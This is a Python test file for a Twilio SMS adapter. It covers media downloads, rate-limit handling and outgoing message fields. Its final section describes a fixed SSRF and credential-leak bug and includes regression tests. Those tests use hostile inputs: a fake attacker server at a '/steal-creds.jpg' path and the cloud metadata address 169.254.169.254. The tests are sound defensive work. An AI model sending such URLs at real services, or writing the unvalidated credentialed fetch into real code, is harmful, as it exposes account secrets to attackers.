"""Tests for the live (non-mock) adapter paths.

These exercise the code that runs in production when there is no `mock`
in config: real media persistence and real HTTP send with graceful 429
handling. HTTP is stubbed by monkeypatching httpx.AsyncClient.post.
"""

from __future__ import annotations

import asyncio
import http.server
import threading

import httpx
import pytest

from glc.channels.catalogue.twilio_sms import artifacts
from glc.channels.catalogue.twilio_sms.adapter import Adapter
from glc.channels.envelope import ChannelReply
from tests.channels.mocks.twilio_sms_mock import BOT_PHONE, OWNER_ID


@pytest.fixture(autouse=True)
def isolated_store(tmp_path, monkeypatch):
    monkeypatch.setenv("GLC_ARTIFACTS_DIR", str(tmp_path))
    return tmp_path


async def test_inbound_mms_persists_bytes_live(monkeypatch):
    """No mock in config -> bytes are downloaded and actually persisted,
    and the emitted attachment ref resolves back to those exact bytes."""
    payload = b"\xff\xd8\xff real jpeg bytes"

    async def fake_download(self, url):
        return payload

    monkeypatch.setattr(Adapter, "_download_media", fake_download)

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    raw = {
        "From": OWNER_ID,
        "To": BOT_PHONE,
        "Body": "photo",
        "MessageSid": "MM1",
        "NumMedia": "1",
        "MediaUrl0": "https://api.twilio.com/Media/real.jpg",
        "MediaContentType0": "image/jpeg",
    }
    msg = await adapter.on_message(raw)

    assert len(msg.attachments) == 1
    ref = msg.attachments[0].ref
    assert ref.startswith("art:")
    assert artifacts.get_bytes(ref) == payload  # persisted, not discarded


async def test_inbound_mms_download_failure_is_non_fatal(monkeypatch):
    """A download failure (network error, 403, ...) for one media item must
    not crash on_message — it should be skipped and recorded, not raised."""

    async def fake_download(self, url):
        raise httpx.HTTPStatusError("403 Forbidden", request=None, response=None)

    monkeypatch.setattr(Adapter, "_download_media", fake_download)

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    raw = {
        "From": OWNER_ID,
        "To": BOT_PHONE,
        "Body": "photo",
        "MessageSid": "MM2",
        "NumMedia": "1",
        "MediaUrl0": "https://example.com/blocked.jpg",
        "MediaContentType0": "image/jpeg",
    }
    msg = await adapter.on_message(raw)  # must not raise

    assert msg.text == "photo"
    assert msg.attachments == []
    assert msg.metadata["failed_media"][0]["url"] == "https://example.com/blocked.jpg"
    assert "403 Forbidden" in msg.metadata["failed_media"][0]["error"]


async def test_inbound_mms_partial_failure_keeps_successful_attachment(monkeypatch):
    """One bad MediaUrl among several must not drop the good ones."""
    good_bytes = b"\xff\xd8\xff good jpeg"
    calls = {"n": 0}

    async def flaky_download(self, url):
        calls["n"] += 1
        if "bad" in url:
            raise httpx.HTTPStatusError("403 Forbidden", request=None, response=None)
        return good_bytes

    monkeypatch.setattr(Adapter, "_download_media", flaky_download)

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    raw = {
        "From": OWNER_ID,
        "To": BOT_PHONE,
        "Body": "two photos",
        "MessageSid": "MM3",
        "NumMedia": "2",
        "MediaUrl0": "https://example.com/bad.jpg",
        "MediaContentType0": "image/jpeg",
        "MediaUrl1": "https://example.com/good.jpg",
        "MediaContentType1": "image/jpeg",
    }
    msg = await adapter.on_message(raw)

    assert len(msg.attachments) == 1
    assert artifacts.get_bytes(msg.attachments[0].ref) == good_bytes
    assert len(msg.metadata["failed_media"]) == 1
    assert msg.metadata["failed_media"][0]["url"] == "https://example.com/bad.jpg"


class _FakeClient:
    """Stand-in for httpx.AsyncClient that never opens a real connection
    (constructing a real client fails under the test sandbox's SSL setup)."""

    captured: dict = {}

    def __init__(self, response):
        self._response = response

    def __call__(self, *args, **kwargs):  # httpx.AsyncClient() -> instance
        return self

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    async def post(self, url, **kwargs):
        _FakeClient.captured = {"url": url, **kwargs}
        return self._response


def _patch_client(monkeypatch, status_code, json_body):
    resp = httpx.Response(status_code=status_code, json=json_body)
    monkeypatch.setattr(httpx, "AsyncClient", _FakeClient(resp))


async def test_send_429_returns_dict_not_raise(monkeypatch):
    body = {"code": 20429, "message": "Too Many Requests", "status": 429}
    _patch_client(monkeypatch, 429, body)

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    reply = ChannelReply(channel="twilio_sms", channel_user_id=OWNER_ID, text="x")
    result = await adapter.send(reply)  # must not raise

    assert isinstance(result, dict)
    assert result.get("status") == 429 or result.get("code") == 20429


async def test_send_success_uses_capitalised_fields(monkeypatch):
    _patch_client(monkeypatch, 201, {"sid": "SM1", "status": "queued"})

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    reply = ChannelReply(channel="twilio_sms", channel_user_id=OWNER_ID, text="hi")
    result = await adapter.send(reply)

    assert result.get("sid") == "SM1"
    sent = _FakeClient.captured["data"]
    assert sent["From"] == BOT_PHONE
    assert sent["To"] == OWNER_ID
    assert sent["Body"] == "hi"
    # Lowercase Twilio keys must never appear.
    assert "from" not in sent and "to" not in sent and "body" not in sent


async def test_send_no_from_raises_in_live_mode():
    adapter = Adapter(config={})  # no phone, no mock
    reply = ChannelReply(channel="twilio_sms", channel_user_id=OWNER_ID, text="x")
    with pytest.raises(RuntimeError):
        await adapter.send(reply)


# ─────────────────────────────────────────────────────────────────────────
# Part 2 finding (new bug, not in Session 12 Section 6/7): _download_media()
# used to fetch ANY url with no validation and attach this deployment's live
# TWILIO_ACCOUNT_SID/TWILIO_AUTH_TOKEN as HTTP Basic Auth to whatever host
# that url pointed at -- an SSRF plus a live-credential-exfiltration
# primitive triggerable via an inbound message's MediaUrl0/1/... field. See
# the docstring on Adapter._download_media in adapter.py for the full
# writeup. These tests prove the fix: a non-Twilio host is rejected before
# any network connection is attempted (so the credential is never sent),
# using a real local HTTP server as the "attacker" to prove zero requests
# reach it -- not just that an exception is raised.
# ─────────────────────────────────────────────────────────────────────────


class _CapturingHandler(http.server.BaseHTTPRequestHandler):
    """Stands in for an attacker-controlled server. Records every request it
    receives (path + Authorization header) so a test can assert none arrived."""

    received: list[dict] = []

    def do_GET(self):  # noqa: N802 - stdlib handler method name
        _CapturingHandler.received.append(
            {"path": self.path, "authorization": self.headers.get("Authorization")}
        )
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        self.wfile.write(b"if you can read this, credentials leaked")

    def log_message(self, format, *args):  # noqa: A002 - silence stderr spam
        pass


async def test_download_media_rejects_non_twilio_host_and_leaks_no_credential(monkeypatch):
    """The core Part 2 regression test: a MediaUrl pointing anywhere other
    than Twilio's own media API must be refused, and the attacker-controlled
    host must receive zero connection attempts (i.e. the live Twilio
    credentials are never placed on the wire toward it)."""
    _CapturingHandler.received = []
    server = http.server.HTTPServer(("127.0.0.1", 0), _CapturingHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        monkeypatch.setenv("TWILIO_ACCOUNT_SID", "ACfaketestsidfaketestsidfaketest")
        monkeypatch.setenv("TWILIO_AUTH_TOKEN", "faketesttoken-do-not-leak-me")
        adapter = Adapter(config={"phone_number": BOT_PHONE})

        with pytest.raises(ValueError, match="non-Twilio host"):
            await adapter._download_media(f"http://127.0.0.1:{port}/steal-creds.jpg")

        # Give any (incorrectly-sent) request a moment to land before we
        # assert the negative -- avoids a flaky false-pass on a slow box.
        await asyncio.sleep(0.05)
        assert _CapturingHandler.received == [], (
            "attacker-controlled host received a request -- credentials were exposed"
        )
    finally:
        server.shutdown()
        thread.join(timeout=2)


async def test_download_media_rejects_cloud_metadata_address():
    """Classic SSRF target (AWS/GCP/Azure/Modal's own 169.254.169.254) must
    be refused the same way -- it isn't a twilio.com host either."""
    adapter = Adapter(config={"phone_number": BOT_PHONE})
    with pytest.raises(ValueError, match="non-Twilio host"):
        await adapter._download_media("http://169.254.169.254/latest/meta-data/")


async def test_download_media_still_accepts_real_twilio_host(monkeypatch):
    """Fix must not regress the legitimate path: an actual api.twilio.com
    MediaUrl still reaches the safety checks and proceeds to the real fetch
    (stubbed here so the test doesn't hit the network). DNS resolution
    itself is exercised by ssrf_guard's own tests; here we only prove the
    new Twilio-host allowlist doesn't block legitimate Twilio media URLs, so
    the (deterministic, non-network) DNS lookup inside assert_safe_url is
    stubbed rather than relied on."""
    import glc.security.ssrf_guard as ssrf_guard

    monkeypatch.setattr(ssrf_guard, "assert_safe_url", lambda url: None)

    class _FakeMediaClient:
        def __init__(self, *a, **kw):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def get(self, url, auth=None):
            assert url == "https://api.twilio.com/2010-04-01/Accounts/AC1/Media/ME1"
            assert auth == ("ACfake", "tokfake")
            return httpx.Response(200, content=b"\xff\xd8\xff jpeg bytes", request=httpx.Request("GET", url))

    monkeypatch.setenv("TWILIO_ACCOUNT_SID", "ACfake")
    monkeypatch.setenv("TWILIO_AUTH_TOKEN", "tokfake")
    monkeypatch.setattr(httpx, "AsyncClient", _FakeMediaClient)

    adapter = Adapter(config={"phone_number": BOT_PHONE})
    data = await adapter._download_media("https://api.twilio.com/2010-04-01/Accounts/AC1/Media/ME1")
    assert data == b"\xff\xd8\xff jpeg bytes"
